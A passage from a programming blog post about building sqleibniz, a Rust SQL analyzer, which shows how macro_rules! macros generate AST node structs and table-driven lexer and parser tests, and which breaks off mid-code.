creates a really great dev experience for sql.</p><p>Furthermore, I want to be able to show the user high quality error messages
with context, explainations and the ability to mute certain diagnostics.</p><p>This analysis includes the stages of lexical analysis/tokenisation, the
parsing of SQL according to the sqlite documentation<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> and
the analysis of the resulting constructs.</p><p>After completing the static analysis part of the project, I plan on writing a
lsp server for sql, so stay tuned for that.</p></blockquote><p>In the process of the above, I need to write a tokenizer and a parser - both
for SQL. While I am nowhere near completion of sqleibniz, I still made some
discoveries around rust and the handy features the language provides for
developing said software.</p><h2 id="macros">Macros</h2><p>Macros work different in most languages. However they are used for mostly the
same reasons: code deduplication and less repetition.</p><h3 id="abstract-syntax-tree-nodes">Abstract Syntax Tree Nodes</h3><p>A node for a statement in <code>sqleibniz</code> implementation is defined as follows:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span>
</span></span><span><span>2</span><span><span>#[derive(Debug)]</span>
</span></span><span><span>3</span><span><span>/// holds all literal types, such as strings, numbers, etc.
</span></span></span><span><span>4</span><span><span></span><span>pub</span> <span>struct</span> <span>Literal</span> {
</span></span><span><span>5</span><span>    <span>pub</span> t: <span>Token</span>,
</span></span><span><span>6</span><span>}
</span></span></code></pre></div><p>Furthermore all nodes are required to implement the <code>Node</code>-trait, this trait
is returned by all parser functions and is later used to analyse the contents
of a statement:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>pub</span> <span>trait</span> Node: <span>std</span>::fmt::Debug {
</span></span><span><span>2</span><span>    <span>fn</span> <span>token</span>(<span>&amp;</span>self) -&gt; <span>&amp;</span><span>Token</span>;
</span></span><span><span>3</span><span>}
</span></span></code></pre></div><h4 id="code-duplication">Code duplication</h4><p>Thus every node not only has to be defined, but an implementation for the
<code>Node</code>-trait has to be written. This requires a lot of code duplication and
rust has a solution for that.</p><p>I want a macro that is able to:</p><ul><li>define a structure with a given identifier and a doc comment</li><li>add arbitrary fields to the structure</li><li>satisfying the <code>Node</code> trait by implementing <code>fn token(&amp;self) -&gt; &amp;Token</code></li></ul><p>Lets take a look at the full code I need the macro to produce for the
<code>Literal</code> and the <code>Explain</code> nodes. While the first one has no further fields
except the <code>Token</code> field <code>t</code>, the second node requires a child field with a
type.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>#[derive(Debug)]</span>
</span></span><span><span> 2</span><span><span>/// holds all literal types, such as strings, numbers, etc.
</span></span></span><span><span> 3</span><span><span></span><span>pub</span> <span>struct</span> <span>Literal</span> {
</span></span><span><span> 4</span><span>    <span>/// predefined for all structures defined with the node! macro
</span></span></span><span><span> 5</span><span><span></span>    <span>pub</span> t: <span>Token</span>,
</span></span><span><span> 6</span><span>}
</span></span><span><span> 7</span><span><span>impl</span> Node <span>for</span> Literal {
</span></span><span><span> 8</span><span>    <span>fn</span> <span>token</span>(<span>&amp;</span>self) -&gt; <span>&amp;</span><span>Token</span> {
</span></span><span><span> 9</span><span>        <span>&amp;</span>self.t
</span></span><span><span>10</span><span>    }
</span></span><span><span>11</span><span>}
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>
</span></span><span><span>14</span><span><span>#[derive(Debug)]</span>
</span></span><span><span>15</span><span><span>/// Explain stmt, see: https://www.sqlite.org/lang_explain.html
</span></span></span><span><span>16</span><span><span></span><span>pub</span> <span>struct</span> <span>Explain</span> {
</span></span><span><span>17</span><span>    <span>/// predefined for all structures defined with the node! macro
</span></span></span><span><span>18</span><span><span></span>    <span>pub</span> t: <span>Token</span>,
</span></span><span><span>19</span><span>    <span>pub</span> child: <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> Node<span>&gt;&gt;</span>,
</span></span><span><span>20</span><span>}
</span></span><span><span>21</span><span><span>impl</span> Node <span>for</span> Explain {
</span></span><span><span>22</span><span>    <span>fn</span> <span>token</span>(<span>&amp;</span>self) -&gt; <span>&amp;</span><span>Token</span> {
</span></span><span><span>23</span><span>        <span>&amp;</span>self.t
</span></span><span><span>24</span><span>    }
</span></span><span><span>25</span><span>}
</span></span></code></pre></div><p>I want the above to be generated from the following two calls:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span>node!(
</span></span><span><span>2</span><span>    Literal,
</span></span><span><span>3</span><span>    <span>"holds all literal types, such as strings, numbers, etc."</span>,
</span></span><span><span>4</span><span>);
</span></span><span><span>5</span><span>node!(
</span></span><span><span>6</span><span>    Explain,
</span></span><span><span>7</span><span>    <span>"Explain stmt, see: https://www.sqlite.org/lang_explain.html"</span>,
</span></span><span><span>8</span><span>    child: <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> Node<span>&gt;&gt;</span>,
</span></span><span><span>9</span><span>);
</span></span></code></pre></div><h4 id="code-deduplication-with-macros">Code deduplication with macros</h4><p>The macro for that is fairly easy, even if the rust macro docs arent that good:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span>macro_rules<span>!</span> node {
</span></span><span><span> 2</span><span>    (<span>$node_name</span>:<span>ident</span>,<span>$documentation</span>:<span>literal</span>,<span>$($field_name</span>:<span>ident</span>:<span>$field_type</span>:<span>ty</span>),<span>*</span>) <span>=&gt;</span> {
</span></span><span><span> 3</span><span>        <span>#[derive(Debug)]</span>
</span></span><span><span> 4</span><span>        <span>#[doc = $documentation]</span>
</span></span><span><span> 5</span><span>        <span>pub</span> <span>struct</span> <span>$node_name</span> {
</span></span><span><span> 6</span><span>            <span>/// predefined for all structures defined with the node! macro, holds the token of the ast node
</span></span></span><span><span> 7</span><span><span></span>            <span>pub</span> t: <span>Token</span>,
</span></span><span><span> 8</span><span>            <span>$(</span>
</span></span><span><span> 9</span><span>                <span>pub</span> <span>$field_name</span>: <span>$field_type</span>,
</span></span><span><span>10</span><span>            )<span>*</span>
</span></span><span><span>11</span><span>        }
</span></span><span><span>12</span><span>        <span>impl</span> Node <span>for</span> <span>$node_name</span> {
</span></span><span><span>13</span><span>            <span>fn</span> <span>token</span>(<span>&amp;</span>self) -&gt; <span>&amp;</span><span>Token</span> {
</span></span><span><span>14</span><span>                <span>&amp;</span>self.t
</span></span><span><span>15</span><span>            }
</span></span><span><span>16</span><span>        }
</span></span><span><span>17</span><span>    };
</span></span><span><span>18</span><span>}
</span></span></code></pre></div><p>Lets disect this macro. The Macro argument/metavariable definition starts with
<code>$node_name:ident,$documentation:literal</code>:</p><div><pre tabindex="0"><code data-lang="text"><span><span> 1</span><span>$node_name : ident , $documentation : literal
</span></span><span><span> 2</span><span>^^^^^^^^^^ ^ ^^^^^ ^
</span></span><span><span> 3</span><span>|          | |     |
</span></span><span><span> 4</span><span>|          | |     metavariable delimiter
</span></span><span><span> 5</span><span>|          | |
</span></span><span><span> 6</span><span>|          | metavariable type
</span></span><span><span> 7</span><span>|          |
</span></span><span><span> 8</span><span>|          metavariable type delimiter
</span></span><span><span> 9</span><span>|
</span></span><span><span>10</span><span>metavariable name
</span></span></code></pre></div><p>Meaning, we define the first metavariable of the macro to be a valid
identifier rust accepts and the second argument to be a literal. A literal
refers to a literal expression, such as chars, strings or raw strings.</p><p>The tricky part that took me some time to grasp is the way of defining
repetition of metavariables in macros, specifically <code>$($field_name:ident:$field_type:ty),*</code>.</p><div><pre tabindex="0"><code data-lang="text"><span><span>1</span><span>$($field_name:ident:$field_type:ty),*
</span></span><span><span>2</span><span>^^                 ^              ^ ^
</span></span><span><span>3</span><span>|                  |              | | 
</span></span><span><span>4</span><span>|                  metavariable   | repetition  
</span></span><span><span>5</span><span>|                  delimiter      | (any) 
</span></span><span><span>6</span><span>|                                 | 
</span></span><span><span>7</span><span>     sub group of metavariables
</span></span></code></pre></div><p>As I understand, we define a subgroup in our metavarible definition and
postfix it with its repetition. We use <code>:</code> to delimit inside the metavariable
sub-group, this enables us to write the macro in a convienient <code>field_name: type</code> way:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span>node!(
</span></span><span><span>2</span><span>    Example,
</span></span><span><span>3</span><span>    <span>"Example docs"</span>, 
</span></span><span><span>4</span><span>
</span></span><span><span>5</span><span>    <span>// sub group start
</span></span></span><span><span>6</span><span><span></span>    field_name: <span>&amp;</span><span>'static</span> <span>str</span>,
</span></span><span><span>7</span><span>    field_name1: <span>String</span>
</span></span><span><span>8</span><span>    <span>// sub group end
</span></span></span><span><span>9</span><span><span></span>);
</span></span></code></pre></div><p>We can use the <code>$(...)*</code> syntax to “loop over” our sub grouped metavariables,
and thus create all fields with their respective names and types:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>pub</span> <span>struct</span> <span>$node_name</span> {
</span></span><span><span>2</span><span>    <span>pub</span> t: <span>Token</span>,
</span></span><span><span>3</span><span>    <span>$(</span>
</span></span><span><span>4</span><span>        <span>pub</span> <span>$field_name</span>: <span>$field_type</span>,
</span></span><span><span>5</span><span>    )<span>*</span>
</span></span><span><span>6</span><span>}
</span></span></code></pre></div><div id="callout"><h3>Tip</h3><p>See
<a href="https://doc.rust-lang.org/reference/macros-by-example.html#repetitions">Repetitions</a>
for the metavariable repetition documentation.</p></div><p>Remember: the <code>$documentation</code> metavariable holds a literal containing our doc
string we want to generate for our node - we now use the <code>#[doc = ...]</code>
annotation instead of the commonly known <code>/// ...</code> syntax to pass our macro
metavariable to the compiler:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>#[doc = $documentation]</span>
</span></span><span><span>2</span><span><span>pub</span> <span>struct</span> <span>$node_name</span> {
</span></span><span><span>3</span><span>    <span>// ...
</span></span></span><span><span>4</span><span><span></span>}
</span></span></code></pre></div><p>I’d say the trait implementation for each node is pretty self explanatory.</p><h3 id="testing">Testing</h3><p>Lets start off with me saying: I love table driven tests and the way Go allows
to write them:</p><div><pre tabindex="0"><code data-lang="go"><span><span> 1</span><span><span>func</span> <span>TestLexerWhitespace</span>(t <span>*</span>testing.T) {
</span></span><span><span> 2</span><span>    cases <span>:=</span> []<span>string</span>{<span>""</span>,<span>"\t"</span>, <span>"\r\n"</span>, <span>" "</span>}
</span></span><span><span> 3</span><span>    <span>for</span> _, c <span>:=</span> <span>range</span> cases {
</span></span><span><span> 4</span><span>        t.<span>Run</span>(c, <span>func</span> (t <span>*</span>testing.T) {
</span></span><span><span> 5</span><span>            l <span>:=</span> Lexer{}
</span></span><span><span> 6</span><span>            l.<span>init</span>(c)
</span></span><span><span> 7</span><span>            l.<span>run</span>()
</span></span><span><span> 8</span><span>        })
</span></span><span><span> 9</span><span>    }
</span></span><span><span>10</span><span>}
</span></span></code></pre></div><p>In Go, I define an array of cases and just execute a test function for each
case <code>c</code>. As far as I know, Rust does not offer a similar test method - so
made one 😼.</p><h4 id="lexer--tokenizer-tests">Lexer / Tokenizer Tests</h4><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>#[cfg(test)]</span>
</span></span><span><span> 2</span><span><span>mod</span> should_pass {
</span></span><span><span> 3</span><span>    test_group_pass_assert! {
</span></span><span><span> 4</span><span>        string,
</span></span><span><span> 5</span><span>        string: <span>"'text'"</span><span>=</span>vec![Type::<span>String</span>(<span>String</span>::from(<span>"text"</span>))],
</span></span><span><span> 6</span><span>        empty_string: <span>"''"</span><span>=</span>vec![Type::<span>String</span>(<span>String</span>::from(<span>""</span>))],
</span></span><span><span> 7</span><span>        string_with_ending: <span>"'str';"</span><span>=</span>vec![Type::<span>String</span>(<span>String</span>::from(<span>"str"</span>)), Type::Semicolon]
</span></span><span><span> 8</span><span>    }
</span></span><span><span> 9</span><span>
</span></span><span><span>10</span><span>    <span>// ...
</span></span></span><span><span>11</span><span><span></span>}
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span><span>#[cfg(test)]</span>
</span></span><span><span>14</span><span><span>mod</span> should_fail {
</span></span><span><span>15</span><span>    test_group_fail! {
</span></span><span><span>16</span><span>        empty_input,
</span></span><span><span>17</span><span>        empty: <span>""</span>,
</span></span><span><span>18</span><span>        empty_with_escaped: <span>"</span><span>\\</span><span>"</span>,
</span></span><span><span>19</span><span>        empty_with_space: <span>" </span><span>\t\n\r</span><span>"</span>
</span></span><span><span>20</span><span>    }
</span></span><span><span>21</span><span>
</span></span><span><span>22</span><span>    <span>// ...
</span></span></span><span><span>23</span><span><span></span>}
</span></span></code></pre></div><p>Executing these via <code>cargo test</code>, results in the same output I love from table
driven tests in Go, each function having its own log and feedback
(<code>ok</code>/<code>fail</code>):</p><div><pre tabindex="0"><code data-lang="text"><span><span> 1</span><span>running 68 tests
</span></span><span><span> 2</span><span>test lexer::tests::should_pass::string::empty_string ... ok
</span></span><span><span> 3</span><span>test lexer::tests::should_pass::string::string ... ok
</span></span><span><span> 4</span><span>test lexer::tests::should_pass::string::string_with_ending ... ok
</span></span><span><span> 5</span><span>test lexer::tests::should_fail::empty_input::empty ... ok
</span></span><span><span> 6</span><span>test lexer::tests::should_fail::empty_input::empty_with_escaped ... ok
</span></span><span><span> 7</span><span>test lexer::tests::should_fail::empty_input::empty_with_space ... ok
</span></span><span><span> 8</span><span>
</span></span><span><span> 9</span><span>test result: ok. 68 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; 
</span></span><span><span>10</span><span>finished in 0.00s
</span></span></code></pre></div><p>The macro accepts the name of the test group, for example: <code>booleans</code> and
<code>string</code> and a list of input and expected output pairs. The input is passed to
the <code>Lexer</code> initialisation and the output of the <code>Lexer.run()</code> is compared
against the expected output. Inlining the <code>test_group_pass_assert!</code> call for
<code>string</code> results in the code below. Before asserting the equality of the
resulting token types and the expected token types, a transformation is
necessary, I map over the token vector and only return their types.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>mod</span> string {
</span></span><span><span> 2</span><span>    <span>use</span> <span>crate</span>::{lexer, types::Type};
</span></span><span><span> 3</span><span>
</span></span><span><span> 4</span><span>    <span>#[test]</span>
</span></span><span><span> 5</span><span>    <span>fn</span> <span>string</span>() {
</span></span><span><span> 6</span><span>        <span>let</span> input <span>=</span> <span>"'text'"</span>.as_bytes().to_vec();
</span></span><span><span> 7</span><span>        <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"lexer_tests_pass"</span>);
</span></span><span><span> 8</span><span>        <span>let</span> toks <span>=</span> l.run();
</span></span><span><span> 9</span><span>        assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>10</span><span>        assert_eq!(
</span></span><span><span>11</span><span>            toks.into_iter().map(<span>|</span>tok<span>|</span> tok.ttype).collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(),
</span></span><span><span>12</span><span>            (vec![Type::<span>String</span>(<span>String</span>::from(<span>"text"</span>))])
</span></span><span><span>13</span><span>        );
</span></span><span><span>14</span><span>    }
</span></span><span><span>15</span><span>
</span></span><span><span>16</span><span>    <span>#[test]</span>
</span></span><span><span>17</span><span>    <span>fn</span> <span>empty_string</span>() {
</span></span><span><span>18</span><span>        <span>let</span> input <span>=</span> <span>"''"</span>.as_bytes().to_vec();
</span></span><span><span>19</span><span>        <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"lexer_tests_pass"</span>);
</span></span><span><span>20</span><span>        <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>21</span><span>        assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>22</span><span>        assert_eq!(
</span></span><span><span>23</span><span>            toks.into_iter().map(<span>|</span>tok<span>|</span> tok.ttype).collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(),
</span></span><span><span>24</span><span>            (vec![Type::<span>String</span>(<span>String</span>::from(<span>""</span>))])
</span></span><span><span>25</span><span>        );
</span></span><span><span>26</span><span>    }
</span></span><span><span>27</span><span>
</span></span><span><span>28</span><span>    <span>#[test]</span>
</span></span><span><span>29</span><span>    <span>fn</span> <span>string_with_ending</span>() {
</span></span><span><span>30</span><span>        <span>let</span> input <span>=</span> <span>"'str';"</span>.as_bytes().to_vec();
</span></span><span><span>31</span><span>        <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"lexer_tests_pass"</span>);
</span></span><span><span>32</span><span>        <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>33</span><span>        assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>34</span><span>        assert_eq!(
</span></span><span><span>35</span><span>            toks.into_iter().map(<span>|</span>tok<span>|</span> tok.ttype).collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(),
</span></span><span><span>36</span><span>            (vec![Type::<span>String</span>(<span>String</span>::from(<span>"str"</span>)), Type::Semicolon])
</span></span><span><span>37</span><span>        );
</span></span><span><span>38</span><span>    }
</span></span><span><span>39</span><span>}
</span></span></code></pre></div><p>The counter part <code>test_group_fail!</code> for <code>empty_input!</code> produces the code below.
The main difference being the assertion of the resulting token vector to be
empty and the <code>Lexer.errors</code> field to contain at least on error.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>mod</span> empty_input {
</span></span><span><span> 2</span><span>    <span>use</span> <span>crate</span>::lexer;
</span></span><span><span> 3</span><span>
</span></span><span><span> 4</span><span>    <span>#[test]</span>
</span></span><span><span> 5</span><span>    <span>fn</span> <span>empty</span>() {
</span></span><span><span> 6</span><span>        <span>let</span> source <span>=</span> <span>""</span>.as_bytes().to_vec();
</span></span><span><span> 7</span><span>        <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>source, <span>"lexer_tests_fail"</span>);
</span></span><span><span> 8</span><span>        <span>let</span> toks <span>=</span> l.run();
</span></span><span><span> 9</span><span>        assert_eq!(toks.len(), <span>0</span>);
</span></span><span><span>10</span><span>        assert_ne!(l.errors.len(), <span>0</span>);
</span></span><span><span>11</span><span>    }
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>    <span>#[test]</span>
</span></span><span><span>14</span><span>    <span>fn</span> <span>empty_with_escaped</span>() {
</span></span><span><span>15</span><span>        <span>let</span> source <span>=</span> <span>"</span><span>\\</span><span>"</span>.as_bytes().to_vec();
</span></span><span><span>16</span><span>        <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>source, <span>"lexer_tests_fail"</span>);
</span></span><span><span>17</span><span>        <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>18</span><span>        assert_eq!(toks.len(), <span>0</span>);
</span></span><span><span>19</span><span>        assert_ne!(l.errors.len(), <span>0</span>);
</span></span><span><span>20</span><span>    }
</span></span><span><span>21</span><span>
</span></span><span><span>22</span><span>    <span>#[test]</span>
</span></span><span><span>23</span><span>    <span>fn</span> <span>empty_with_space</span>() {
</span></span><span><span>24</span><span>        <span>let</span> source <span>=</span> <span>" </span><span>\t\n\r</span><span>"</span>.as_bytes().to_vec();
</span></span><span><span>25</span><span>        <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>source, <span>"lexer_tests_fail"</span>);
</span></span><span><span>26</span><span>        <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>27</span><span>        assert_eq!(toks.len(), <span>0</span>);
</span></span><span><span>28</span><span>        assert_ne!(l.errors.len(), <span>0</span>);
</span></span><span><span>29</span><span>    }
</span></span><span><span>30</span><span>}
</span></span></code></pre></div><p>Lets take a look at the macros itself, I will not go into detail around the
macro definition - simply because I explained the meta variable declaration in
the previous <a href="#code-deduplication-with-macros">chapter</a>. The first macro is
uesd for the assertions of test with valid inputs - <code>test_group_pass_assert!</code>:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span>macro_rules<span>!</span> test_group_pass_assert {
</span></span><span><span> 2</span><span>    (<span>$group_name</span>:<span>ident</span>,<span>$($ident</span>:<span>ident</span>:<span>$input</span>:<span>literal</span><span>=</span><span>$expected</span>:<span>expr</span>),<span>*</span>) <span>=&gt;</span> {
</span></span><span><span> 3</span><span>    <span>mod</span> <span>$group_name</span> {
</span></span><span><span> 4</span><span>        <span>use</span> <span>crate</span>::{lexer, types::Type};
</span></span><span><span> 5</span><span>
</span></span><span><span> 6</span><span>        <span>$(</span>
</span></span><span><span> 7</span><span>            <span>#[test]</span>
</span></span><span><span> 8</span><span>            <span>fn</span> <span>$ident</span>() {
</span></span><span><span> 9</span><span>                <span>let</span> input <span>=</span> <span>$input</span>.as_bytes().to_vec();
</span></span><span><span>10</span><span>                <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"lexer_tests_pass"</span>);
</span></span><span><span>11</span><span>                <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>12</span><span>                assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>13</span><span>                assert_eq!(toks.into_iter().map(<span>|</span>tok<span>|</span> tok.ttype).collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(), <span>$expected</span>);
</span></span><span><span>14</span><span>            }
</span></span><span><span>15</span><span>        )<span>*</span>
</span></span><span><span>16</span><span>        }
</span></span><span><span>17</span><span>    };
</span></span><span><span>18</span><span>}
</span></span></code></pre></div><p>While the second is used for invalid inputs and edge case testing with expected
errors - <code>test_group_fail!</code>:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span>macro_rules<span>!</span> test_group_fail {
</span></span><span><span> 2</span><span>    (<span>$group_name</span>:<span>ident</span>,<span>$($name</span>:<span>ident</span>:<span>$value</span>:<span>literal</span>),<span>*</span>) <span>=&gt;</span> {
</span></span><span><span> 3</span><span>        <span>mod</span> <span>$group_name</span> {
</span></span><span><span> 4</span><span>        <span>use</span> <span>crate</span>::lexer;
</span></span><span><span> 5</span><span>        <span>$(</span>
</span></span><span><span> 6</span><span>            <span>#[test]</span>
</span></span><span><span> 7</span><span>            <span>fn</span> <span>$name</span>() {
</span></span><span><span> 8</span><span>                <span>let</span> source <span>=</span> <span>$value</span>.as_bytes().to_vec();
</span></span><span><span> 9</span><span>                <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>source, <span>"lexer_tests_fail"</span>);
</span></span><span><span>10</span><span>                <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>11</span><span>                assert_eq!(toks.len(), <span>0</span>);
</span></span><span><span>12</span><span>                assert_ne!(l.errors.len(), <span>0</span>);
</span></span><span><span>13</span><span>            }
</span></span><span><span>14</span><span>         )<span>*</span>
</span></span><span><span>15</span><span>        }
</span></span><span><span>16</span><span>    };
</span></span><span><span>17</span><span>}
</span></span></code></pre></div><h4 id="parser-tests">Parser Tests</h4><p>I use the same concepts and almost the same macros in the <code>parser</code> module to
test the results the parser produces, but this time focussing on edge cases and
full sql statements. For instance the tests expected to pass and to fail for
the <code>EXPLAIN</code> sql statement:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>#[cfg(test)]</span>
</span></span><span><span> 2</span><span><span>mod</span> should_pass {
</span></span><span><span> 3</span><span>    test_group_pass_assert! {
</span></span><span><span> 4</span><span>        sql_stmt_prefix,
</span></span><span><span> 5</span><span>        explain: <span>r</span>#<span>"EXPLAIN VACUUM;"</span>#<span>=</span>vec![Type::Keyword(Keyword::<span>EXPLAIN</span>)],
</span></span><span><span> 6</span><span>        explain_query_plan: <span>r</span>#<span>"EXPLAIN QUERY PLAN VACUUM;"</span>#<span>=</span>vec![Type::Keyword(Keyword::<span>EXPLAIN</span>)]
</span></span><span><span> 7</span><span>    }
</span></span><span><span> 8</span><span>}
</span></span><span><span> 9</span><span>
</span></span><span><span>10</span><span><span>#[cfg(test)]</span>
</span></span><span><span>11</span><span><span>mod</span> should_fail {
</span></span><span><span>12</span><span>    test_group_fail! {
</span></span><span><span>13</span><span>        sql_stmt_prefix,
</span></span><span><span>14</span><span>        explain: <span>r</span>#<span>"EXPLAIN;"</span>#,
</span></span><span><span>15</span><span>        explain_query_plan: <span>r</span>#<span>"EXPLAIN QUERY PLAN;"</span>#
</span></span><span><span>16</span><span>    }
</span></span><span><span>17</span><span>}
</span></span></code></pre></div><p>Both macros get the <code>sql_stmt_prefix</code> as their module names, because thats the
function, in the parser, responsible for the <code>EXPLAIN</code> statement. The failing
tests check wheter the parser correctly asserts the conditions the sql standard
lays out, see <a href="https://www.sqlite.org/syntax/sql-stmt.html">sqlite - sql-stmt</a>.
Specifically, either that a statement follows after the <code>EXPLAIN</code> identifier or
the <code>QUERY PLAN</code> and a statement follow.</p><p>The difference between these tests and the tests for the lexer are in the way
the assertions are made. Take a look at the code the macros produce:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>#[cfg(test)]</span>
</span></span><span><span> 2</span><span><span>mod</span> should_pass {
</span></span><span><span> 3</span><span>    <span>mod</span> sql_stmt_prefix {
</span></span><span><span> 4</span><span>        <span>use</span> <span>crate</span>::{lexer, parser::Parser, types::Keyword, types::Type};
</span></span><span><span> 5</span><span>
</span></span><span><span> 6</span><span>        <span>#[test]</span>
</span></span><span><span> 7</span><span>        <span>fn</span> <span>explain</span>() {
</span></span><span><span> 8</span><span>            <span>let</span> input <span>=</span> <span>r</span><span>#"EXPLAIN VACUUM;"#</span>.as_bytes().to_vec();
</span></span><span><span> 9</span><span>            <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"parser_test_pass"</span>);
</span></span><span><span>10</span><span>            <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>11</span><span>            assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>12</span><span>            <span>let</span> <span>mut</span> parser <span>=</span> Parser::new(toks, <span>"parser_test_pass"</span>);
</span></span><span><span>13</span><span>            <span>let</span> ast <span>=</span> parser.parse();
</span></span><span><span>14</span><span>            assert_eq!(parser.errors.len(), <span>0</span>);
</span></span><span><span>15</span><span>            assert_eq!(
</span></span><span><span>16</span><span>                ast.into_iter()
</span></span><span><span>17</span><span>                    .map(<span>|</span>o<span>|</span> o.unwrap().token().ttype.clone())
</span></span><span><span>18</span><span>                    .collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(),
</span></span><span><span>19</span><span>                (vec![Type::Keyword(Keyword::<span>EXPLAIN</span>)])
</span></span><span><span>20</span><span>            );
</span></span><span><span>21</span><span>        }
</span></span><span><span>22</span><span>
</span></span><span><span>23</span><span>        <span>#[test]</span>
</span></span><span><span>24</span><span>        <span>fn</span> <span>explain_query_plan</span>() {
</span></span><span><span>25</span><span>            <span>let</span> input <span>=</span> <span>r</span><span>#"EXPLAIN QUERY PLAN VACUUM;"#</span>.as_bytes().to_vec();
</span></span><span><span>26</span><span>            <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"parser_test_pass"</span>);
</span></span><span><span>27</span><span>            <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>28</span><span>            assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>29</span><span>            <span>let</span> <span>mut</span> parser <span>=</span> Parser::new(toks, <span>"parser_test_pass"</span>);
</span></span><span><span>30</span><span>            <span>let</span> ast <span>=</span> parser.parse();
</span></span><span><span>31</span><span>            assert_eq!(parser.errors.len(), <span>0</span>);
</span></span><span><span>32</span><span>            assert_eq!(
</span></span><span><span>33</span><span>                ast.into_iter()
</span></span><span><span>34</span><span>                    .map(<span>|</span>o<span>|</span> o.unwrap().token().ttype.clone())
</span></span><span><span>35</span><span>                    .collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(),
</span></span><span><span>36</span><span>                (vec![Type::Keyword(Keyword::<span>EXPLAIN</span>)])
</span></span><span><span>37</span><span>            );
</span></span><span><span>38</span><span>        }
</span></span><span><span>39</span><span>    }
</span></span><span><span>40</span><span>}
</span></span></code></pre></div><p>As shown, the <code>test_group_pass_assert!</code> macro in the <code>parser</code> module starts
with the same <code>Lexer</code> initialisation and empty error vector assertion. However,
the next step is to initialise the <code>Parser</code> structure and after parsing assert
the outcome - i.e. no errors and nodes with the correct types.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>#[cfg(test)]</span>
</span></span><span><span> 2</span><span><span>mod</span> should_fail {
</span></span><span><span> 3</span><span>    <span>mod</span> sql_stmt_prefix {
</span></span><span><span> 4</span><span>        <span>use</span> <span>crate</span>::{lexer, parser::Parser};
</span></span><span><span> 5</span><span>        <span>#[test]</span>
</span></span><span><span> 6</span><span>        <span>fn</span> <span>explain</span>() {
</span></span><span><span> 7</span><span>            <span>let</span> input <span>=</span> <span>r</span><span>#"EXPLAIN;"#</span>.as_bytes().to_vec();
</span></span><span><span> 8</span><span>            <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"parser_test_fail"</span>);
</span></span><span><span> 9</span><span>            <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>10</span><span>            assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>11</span><span>            <span>let</span> <span>mut</span> parser <span>=</span> Parser::new(toks, <span>"parser_test_fail"</span>);
</span></span><span><span>12</span><span>            <span>let</span> _ <span>=</span> parser.parse();
</span></span><span><span>13</span><span>            assert_ne!(parser.errors.len(), <span>0</span>);
</span></span><span><span>14</span><span>        }
</span></span><span><span>15</span><span>
</span></span><span><span>16</span><span>        <span>#[test]</span>
</span></span><span><span>17</span><span>        <span>fn</span> <span>explain_query_plan</span>() {
</span></span><span><span>18</span><span>            <span>let</span> input <span>=</span> <span>r</span><span>#"EXPLAIN QUERY PLAN;"#</span>.as_bytes().to_vec();
